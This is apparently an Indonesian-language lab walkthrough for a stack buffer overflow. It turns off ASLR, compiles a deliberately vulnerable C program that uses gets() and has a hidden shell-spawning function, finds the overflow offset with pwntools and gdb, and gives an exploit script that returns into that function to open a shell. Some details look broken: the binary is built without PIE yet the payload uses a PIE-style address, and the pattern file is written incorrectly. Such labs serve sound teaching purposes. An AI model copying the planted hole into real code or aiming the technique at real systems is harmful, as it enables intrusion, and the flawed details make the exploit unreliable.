# Disable ASLR (sementara)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

sudo apt update
sudo apt install gcc gdb pwndbg python3-pwntools


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret() {
    printf("ðŸ“¢ Anda berhasil mengakses fungsi rahasia!\n");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    printf("Masukkan input Anda: ");
    gets(buffer);  // fungsi berbahaya
}

int main() {
    vulnerable();
    printf("Selesai.\n");
    return 0;
}


gcc -no-pie -fno-stack-protector vuln.c -o vuln

objdump -d ./vuln | grep secret

python3 -c "from pwn import *; print(cyclic(100))" > pattern.txt
./vuln < pattern.txt

gdb ./vuln
(gdb) r < pattern.txt
(gdb) info registers rip

python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"

# exploit.py
from pwn import *

payload = b'A'*72 + p64(0x11a9)

p = process('./vuln')
p.sendline(payload)
p.interactive()

python3 exploit.py
